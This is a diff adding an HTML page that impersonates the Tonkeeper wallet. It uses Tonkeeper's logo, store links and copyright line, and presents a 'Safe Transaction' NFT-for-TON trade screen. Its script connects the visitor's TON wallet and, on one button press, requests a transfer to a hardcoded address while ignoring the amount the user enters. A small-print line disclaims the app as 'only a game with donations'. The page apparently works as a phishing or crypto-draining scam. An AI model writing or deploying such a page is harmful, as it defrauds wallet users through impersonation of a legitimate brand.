@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ton Site</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="normalize.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">    
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+</head>
+<body>
+    
+    <div class="bot">
+
+        <header class="header">
+            <img src="https://play-lh.googleusercontent.com/RBUyWdycKSK15xSN6RtUFkmeAiRlb5EFDcERcm_4uPEmr35RqiU2r1Zrn7VZQuKmhmU=w240-h480-rw" class="header_image">
+            <div class="header_image"></div>
+            <div id="connect" class="header_button"></div>
+        </header>
+
+        <div class="safe">
+
+            <h2 class="safe_title">Safe Transaction</h2>
+            <div class="safe_container">
+                <h3 class="safe_subtitle">Trade</h3>
+                <img src="./image/free-icon-undo-8563420.png" class="safe_image">
+            </div>
+
+            <div class="sell">
+              <h3 class="sell_title">You sell</h3>
+             
+              <div class="sell_nft">
+                <img src="./image/photo_2023-03-29_23-28-31.jpg" class="sell_image">
+                <select class="select">
+                    <option><p class="sell_subtitle">NFT</p></option>
+                </select>
+               
+              </div>
+            </div>
+            
+            <div class="strelka">
+                <button class="stlrelka_button" onclick="transaction()"><p class="strelka_subtitle">⭣</p></button>
+            </div>
+
+            <div class="ton">
+                <img src="https://www.stakingrewards.com/_next/image?url=https%3A%2F%2Fstorage.googleapis.com%2Fstakingrewards-static%2Fimages%2Fassets%2Fproduction%2Fthe-open-network_logo.png&w=2048&q=75" class="ton_image">
+                <select class="select_ton">
+                    <option><p class="ton_title">TON</p></option>
+                </select>
+            </div>
+
+            <div class="toncoin">
+                <div class="toncoin_input">
+                    <img src="https://www.stakingrewards.com/_next/image?url=https%3A%2F%2Fstorage.googleapis.com%2Fstakingrewards-static%2Fimages%2Fassets%2Fproduction%2Fthe-open-network_logo.png&w=2048&q=75" class="toncoin_src">
+                    <input class="toncoin_number" type="number" min="1" placeholder="Toncoin" max="999">
+                </div>
+                <p class="toncoin_enter">Enter the transfer amount</p>
+            </div>
+            
+
+            <p class="text">
+                Maximize your trading on TON Blockchain with
+                TON Diamonds DEX Aggregator, a comprehensive
+                platform aggregating Ston.fi and DeDust
+                Experience streamlined token trading, access the
+                best market prices, and enjoy unique features like
+                visual charts.
+            </p>
+
+            <div class="tonkeeper">
+            <img src="https://play-lh.googleusercontent.com/RBUyWdycKSK15xSN6RtUFkmeAiRlb5EFDcERcm_4uPEmr35RqiU2r1Zrn7VZQuKmhmU=w240-h480-rw" class="tonkeeper_img">
+            <h3 class="second">Tonkeeper</h3>
+            </div>
+
+            <p class="tonkeeper_subtitle">Best TON wallet for high quality NFT collections
+                and digital artists with privileges for holders. Buy,
+                sell, and explore the crypto world.
+            </p>
+
+            <h2 class="protection">Confidential and Protected</h2>
+            <p class="protection_sub">Non-custodial wallets for greater security, control, and privacy to users, making them a preferred choice for individuals who prioritize the principles of decentralization and self-sovereignty in managing their cryptocurrency assets.</p>
+            
+            <div class="link">
+            <a href="https://chromewebstore.google.com/detail/tonkeeper-%E2%80%94-wallet-for-to/omaabbefbmiijedngplfjmnooppbclkk?utm_source=tonkeeper_index"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/1024px-Google_Chrome_icon_%28February_2022%29.svg.png" class="img_chrom"></a>
+            <a href="https://addons.mozilla.org/en-US/firefox/addon/tonkeeper/?utm_source=tonkeeper_index"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Firefox_logo%2C_2019.svg/640px-Firefox_logo%2C_2019.svg.png" class="img_chrom"></a>
+            <a href="https://apps.apple.com/ru/app/tonkeeper/id1587742107"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/67/App_Store_%28iOS%29.svg/640px-App_Store_%28iOS%29.svg.png" class="img_chrom"></a>
+        
+            </div>
+
+            <p class="text">© 2024 Tonkeeper. All rights reserved.
+                All trademarks are the property of their respective owners.</p>
+           
+
+            <p class="text_1">
+                When transferring money, you voluntarily transfer it. This application is not official but only a game with donations</p>
+      
+        </div>
+     
+    </div>
+
+    <script>
+    
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://terabait223.github.io/Bot-/tonconnect-manifest.json',
+            buttonRootId: 'connect'
+        });
+        
+        async function transaction() {
+            const transaction = {
+                validUntil: Math.round(Date.now() / 1000) + 10,
+                messages: [
+                    {
+                        address: "UQBhlMg55GjCrHNms-c3ppVncwVwH3qf-rtWJ5XX1NsGQqIa",
+                        amount: "10000000"
+                    }
+                ] 
+            };
+
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+            } catch (e) {
+                console.error(e);
+            }
+        } 
+
+    </script> 
+
+    
+</body>
+</html>
